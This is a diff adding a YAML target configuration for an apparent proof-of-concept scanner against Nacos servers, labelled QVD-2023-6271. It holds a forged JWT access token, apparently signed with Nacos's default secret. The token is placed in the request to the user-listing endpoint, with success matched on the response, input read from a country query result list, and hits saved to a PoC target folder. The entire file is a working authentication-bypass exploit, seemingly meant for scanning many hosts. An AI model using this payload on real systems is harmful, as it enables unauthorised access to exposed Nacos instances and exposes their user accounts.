@@ -1,0 +1,17 @@
+targetPath: /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
+targetMethod: GET
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    accessToken: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: username
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/nacos_QVD-2023-6271/
+targetRestText: 2
